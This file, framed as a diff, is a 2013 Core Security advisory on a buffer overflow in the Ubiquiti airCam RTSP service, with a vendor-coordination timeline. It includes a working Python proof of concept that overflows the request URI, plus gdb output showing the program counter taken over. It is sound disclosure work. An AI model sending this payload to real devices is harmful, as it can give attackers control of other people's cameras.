@@ -1,0 +1,293 @@
+Core Security - Corelabs Advisory
+http://corelabs.coresecurity.com
+
+Buffer overflow in Ubiquiti airCam RTSP service
+
+
+1. *Advisory Information*
+
+Title: Buffer overflow in Ubiquiti airCam RTSP service
+Advisory ID: CORE-2013-0430
+Advisory URL:
+http://www.coresecurity.com/advisories/buffer-overflow-ubiquiti-aircam-rtsp-service
+Date published: 2013-06-11
+Date of last update: 2013-06-11
+Vendors contacted: Ubiquiti
+Release mode: Coordinated release
+
+
+2. *Vulnerability Information*
+
+Class: Classic buffer overflow [CWE-120]
+Impact: Code execution
+Remotely Exploitable: Yes
+Locally Exploitable: No
+CVE Name: CVE-2013-1606
+
+
+3. *Vulnerability Description*
+
+The Ubiquiti [1] airCam RTSP service 'ubnt-streamer', has a buffer
+overflow when parsing the URI of a RTSP request message. This bug allows
+remote attackers to execute arbitrary code via RTSP request message.
+
+
+4. *Vulnerable Packages*
+
+   . Cameras Models: airCam, airCam Mini, airCam Dome.
+   . Firmware Version Verified: AirCam v1.1.5.
+   . Other devices are probably affected too, but they were not checked.
+
+
+5. *Non-Vulnerable Packages*
+
+   . firmware v1.2.0 (airVision 2.x platform).
+   . firmware v1.1.6 (airVision 1.x platform).
+
+6. *Vendor Information, Solutions and Workarounds*
+
+Patched firmware versions can be downloaded from the Ubiquiti official
+website [2], [3].
+
+
+7. *Credits*
+
+These vulnerabilities were discovered and researched by Andres Blanco
+from Core Exploit Writers Team. The publication of this advisory was
+coordinated by Fernando Miranda from Core Advisories Team.
+
+
+8. *Technical Description / Proof of Concept Code*
+
+
+/-----
+#
+# Author: Andres Blanco - CORE Security Technologies.
+#
+# The contents of this software are copyright (c) 2013 CORE Security and
+(c) 2013 CoreLabs,
+# and are licensed under a Creative Commons Attribution Non-Commercial
+Share-Alike 3.0 (United States)
+# License: http://creativecommons.org/licenses/by-nc-sa/3.0/us/
+#
+# THIS SOFTWARE IS PROVIDED ``AS IS'' AND ANY EXPRESS OR IMPLIED
+# WARRANTIES ARE DISCLAIMED. IN NO EVENT SHALL CORE SDI Inc. BE LIABLE
+# FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY OR
+# CONSEQUENTIAL DAMAGES RESULTING FROM THE USE OR MISUSE OF
+# THIS SOFTWARE.
+#
+
+import socket
+
+class RtspRequest(object):
+
+    def __init__(self, ip_address, port):
+        self._ip_address = ip_address
+        self._port = port
+
+    def generate_request(self, method, uri, headers):
+        data = ""
+        data += "%s %s RTSP/1.0\r\n" % (method, uri)
+        for item in headers:
+            header = headers[item]
+            data += "%s: %s\r\n" % (item, header)
+        data += "\r\n"
+        return data
+
+    def send_request(self, data):
+        sd = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        sd.settimeout(15)
+        sd.connect((self._ip_address, self._port))
+        sd.send(data)
+        resp = sd.recv(2048)
+        sd.close()
+        return resp
+
+if __name__ == "__main__":
+    ip = "192.168.100.1"
+    anRtsp = RtspRequest(ip, 554)
+    data = ""
+    data += "A" * 271
+    data += "\x78\x56\x34\x12"
+    uri = "rtsp://%s/%s/live/ch00_0" % (ip, data)
+    headers = { "CSeq" : "1" }
+    req = anRtsp.generate_request("DESCRIBE", uri, headers)
+    rsp = anRtsp.send_request(req)
+-----/
+
+Below the gdb session when executing the PoC.
+
+/-----
+AirCam.v1.1.5# ./gdb --pid 358
+...
+Attaching to process 358
+
+warning: process 358 is a cloned process
+Reading symbols from /bin/ubnt-streamer...(no debugging symbols
+found)...done.
+Reading symbols from /lib/libpthread.so.0...(no debugging symbols
+found)...done.
+...
+0x401c60a0 in select () from /lib/libc.so.6
+(gdb) c
+Continuing.
+
+Program received signal SIGSEGV, Segmentation fault.
+0x12345678 in ?? ()
+(gdb) info registers
+r0             0x0      0
+r1             0x1      1
+r2             0xffffffff       4294967295
+r3             0x1      1
+r4             0x41414141       1094795585
+r5             0x41414141       1094795585
+r6             0x41414141       1094795585
+r7             0xd7198  881048
+r8             0x0      0
+r9             0x0      0
+r10            0xc6119  811289
+r11            0xc625f  811615
+r12            0x23     35
+sp             0x40a7eaf0       0x40a7eaf0
+lr             0x48d34  298292
+pc             0x12345678       0x12345678
+cpsr           0x20000010       536870928
+(gdb) info stack
+#0  0x12345678 in ?? ()
+#1  0x00048d34 in ?? ()
+#2  0x00048d34 in ?? ()
+Backtrace stopped: previous frame identical to this frame (corrupt stack?)
+(gdb) x/50xw $sp-0x80
+0x40a7ea70:     0x41414141      0x41414141      0x41414141      0x41414141
+0x40a7ea80:     0x41414141      0x41414141      0x41414141      0x41414141
+0x40a7ea90:     0x41414141      0x41414141      0x41414141      0x41414141
+0x40a7eaa0:     0x41414141      0x41414141      0x41414141      0x41414141
+0x40a7eab0:     0x41414141      0x41414141      0x41414141      0x41414141
+0x40a7eac0:     0x41414141      0x41414141      0x41414141      0x41414141
+0x40a7ead0:     0x41414141      0x41414141      0x41414141      0x41414141
+0x40a7eae0:     0x41414141      0x41414141      0x41414141      0x12345678
+0x40a7eaf0:     0x76696c2f      0x68632f65      0x305f3030      0x000d7100
+0x40a7eb00:     0x000c6060      0x000c6119      0x00059340      0x000491a8
+0x40a7eb10:     0x000d73f6      0x000c6267      0x00000001      0x000c6060
+0x40a7eb20:     0x000c6119      0x00059340      0x000c6118      0x00049780
+0x40a7eb30:     0x00000000      0x000c611c
+-----/
+
+
+9. *Report Timeline*
+
+. 2013-05-02:
+Core Security Technologies notifies the Ubiquiti team of the
+vulnerability. Publication date is set for May 29th, 2013.
+
+. 2013-05-02:
+Vendor acknowledges the receipt of the email and asks for technical
+details.
+
+. 2013-05-02:
+A draft report with technical details and a PoC sent to Ubiquiti team.
+
+. 2013-05-03:
+Vendor notifies that a new firmware version should address this
+vulnerability. It will be released shortly to the alpha and beta community.
+
+. 2013-05-06:
+Core notifies that the advisory will be re-scheduled to be released when
+patches are available to the alpha and beta community and asks for a
+tentative release date.
+
+. 2013-05-09:
+Core asks for a status update regarding this vulnerability and a
+tentative release date.
+
+. 2013-05-13:
+Vendor notifies the firmware is still in internal testing and the
+release date will be confirmed in the following days.
+
+. 2013-05-27:
+Core notifies that there was no answer in the last 2 weeks regarding the
+release date. Core also notifies that the advisory was re-scheduled for
+Jun 4th, and asks for a clear timeline to justify keep delaying the
+release.
+
+. 2013-05-28:
+Vendor notifies that the new firmware is almost done and a confirmed
+date will be notified in the following days.
+
+. 2013-05-29:
+Core asks if a beta firmware is available for downloading.
+
+. 2013-05-29:
+Vendor notifies that they have a v1.1.6 build of the firmware which is
+being tested internally and will be released very soon, probably this
+week. However, it is not yet available on the ubnt.com/download site.
+
+. 2013-05-29:
+First release date missed.
+
+. 2013-06-03:
+Core asks for a status update.
+
+. 2013-06-03:
+Vendor notifies that they do not have a specific release date yet.
+
+. 2013-06-11:
+Vendor notifies that they released firmware 1.2.0 along with airVision 2
+[2][3], and a public announcement will be made soon. Release of firmware
+1.1.6 (for the airVision 1.x platform) has to be defined.
+
+. 2013-06-11:
+Advisory CORE-2013-0430 published.
+
+
+10. *References*
+
+[1] http://www.ubnt.com.
+[2] Ubiquiti downloads http://www.ubnt.com/download#AirCam.
+[3] Ubiquiti firmware v1.2.0
+http://www.ubnt.com/downloads/AirCam-v1.2.0.build17961.bin.
+
+
+11. *About CoreLabs*
+
+CoreLabs, the research center of Core Security Technologies, is charged
+with anticipating the future needs and requirements for information
+security technologies. We conduct our research in several important
+areas of computer security including system vulnerabilities, cyber
+attack planning and simulation, source code auditing, and cryptography.
+Our results include problem formalization, identification of
+vulnerabilities, novel solutions and prototypes for new technologies.
+CoreLabs regularly publishes security advisories, technical papers,
+project information and shared software tools for public use at:
+http://corelabs.coresecurity.com.
+
+
+12. *About Core Security Technologies*
+
+Core Security Technologies enables organizations to get ahead of threats
+with security test and measurement solutions that continuously identify
+and demonstrate real-world exposures to their most critical assets. Our
+customers can gain real visibility into their security standing, real
+validation of their security controls, and real metrics to more
+effectively secure their organizations.
+
+Core Security's software solutions build on over a decade of trusted
+research and leading-edge threat expertise from the company's Security
+Consulting Services, CoreLabs and Engineering groups. Core Security
+Technologies can be reached at +1 (617) 399-6980 or on the Web at:
+http://www.coresecurity.com.
+
+
+13. *Disclaimer*
+
+The contents of this advisory are copyright (c) 2013 Core Security
+Technologies and (c) 2013 CoreLabs, and are licensed under a Creative
+Commons Attribution Non-Commercial Share-Alike 3.0 (United States)
+License: http://creativecommons.org/licenses/by-nc-sa/3.0/us/
+
+
+14. *PGP/GPG Keys*
+
+This advisory has been signed with the GPG key of Core Security
+Technologies advisories team, which is available for download at
+http://www.coresecurity.com/files/attachments/core_security_advisories.asc.
